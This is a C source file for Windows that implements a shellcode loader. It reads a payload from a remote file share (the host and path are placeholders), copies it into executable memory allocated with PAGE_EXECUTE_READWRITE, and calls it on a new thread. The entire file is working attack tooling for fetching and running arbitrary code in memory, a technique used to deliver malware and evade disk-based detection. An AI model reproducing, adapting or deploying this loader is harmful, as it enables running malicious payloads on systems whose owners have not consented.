#include <windows.h>
#include <winnetwk.h>
#include <wchar.h>

// Function prototype for ThreadFunction
DWORD WINAPI ThreadFunction(LPVOID lpParameter);

// Print error messages
void PrintError(const wchar_t* action) {
    wprintf(L"[!] %s Failed With Error : %d \n", action, GetLastError());
}

BOOL FindFileShare(LPCWSTR szServer, LPCWSTR szFilePath, PBYTE* binaryData, SIZE_T* binarySize) {
    BOOL operationSuccess = TRUE;
    PBYTE allocatedMemory = NULL;

    WCHAR szFullUNCPath[MAX_PATH];
    swprintf_s(szFullUNCPath, MAX_PATH, L"\\\\%s\\%s", szServer, szFilePath);

    wprintf(L"Attempting to open file: %s\n", szFullUNCPath);

    HANDLE hFile = CreateFileW(szFullUNCPath, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE) {
        PrintError(L"CreateFileW");
        operationSuccess = FALSE;
    }
    else {
        wprintf(L"File opened successfully.\n");

        DWORD fileSize = GetFileSize(hFile, NULL);
        if (fileSize == INVALID_FILE_SIZE) {
            PrintError(L"GetFileSize");
            operationSuccess = FALSE;
        }
        else {
            wprintf(L"File size: %u bytes\n", fileSize);

            allocatedMemory = (PBYTE)LocalAlloc(LPTR, fileSize);
            if (allocatedMemory == NULL) {
                PrintError(L"LocalAlloc");
                operationSuccess = FALSE;
            }
            else {
                wprintf(L"Allocated memory for file content.\n");

                DWORD bytesRead;
                if (!ReadFile(hFile, allocatedMemory, fileSize, &bytesRead, NULL)) {
                    PrintError(L"ReadFile");
                    operationSuccess = FALSE;
                }

                *binaryData= allocatedMemory;
                *binarySize = bytesRead;
            }
        }

        CloseHandle(hFile);
    }

    return operationSuccess;
}


BOOL ExecuteBinaryInMemory(const PBYTE BinaryData, SIZE_T DataSize) {
    wprintf(L"Executing binary in memory...\n");

    LPVOID pMemory = VirtualAlloc(NULL, DataSize, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    if (pMemory == NULL) {
        PrintError(L"VirtualAlloc");
        return FALSE;
    }

    memcpy(pMemory, BinaryData, DataSize);

    HANDLE hThread = CreateThread(NULL, 0, ThreadFunction, pMemory, 0, NULL);
    if (hThread == NULL) {
        PrintError(L"CreateThread");
        VirtualFree(pMemory, 0, MEM_RELEASE);
        return FALSE;
    }

    WaitForSingleObject(hThread, INFINITE);
    CloseHandle(hThread);

    VirtualFree(pMemory, 0, MEM_RELEASE);

    wprintf(L"Execution complete.\n");

    return TRUE;
}

DWORD WINAPI ThreadFunction(LPVOID lpParameter) {
    wprintf(L"Thread started...\n");

    PBYTE BinaryData = (PBYTE)lpParameter;
    typedef void (*FunctionPointer)();
    FunctionPointer pFunction = (FunctionPointer)BinaryData;

    wprintf(L"Calling the shellcode function...\n");

    pFunction();

    wprintf(L"Thread completed.\n");

    return 0;
}

int main() { // Change wmain to main
    LPCWSTR szServer = L"HOSTNAME";
    LPCWSTR szFilePath = L"PATH\\TO\\SHELCODE\\FILE";

    wprintf(L"Attempting to load binary from server %s and file path %s\n", szServer, szFilePath);

    PBYTE Payload;
    SIZE_T PayloadSize;

    BOOL success = FindFileShare(szServer, szFilePath, &Payload, &PayloadSize);

    if (success) {
        wprintf(L"Binary loaded successfully. Executing...\n");

        success = ExecuteBinaryInMemory(Payload, PayloadSize);

        LocalFree(Payload);
    }

    return success ? 0 : 1;
}
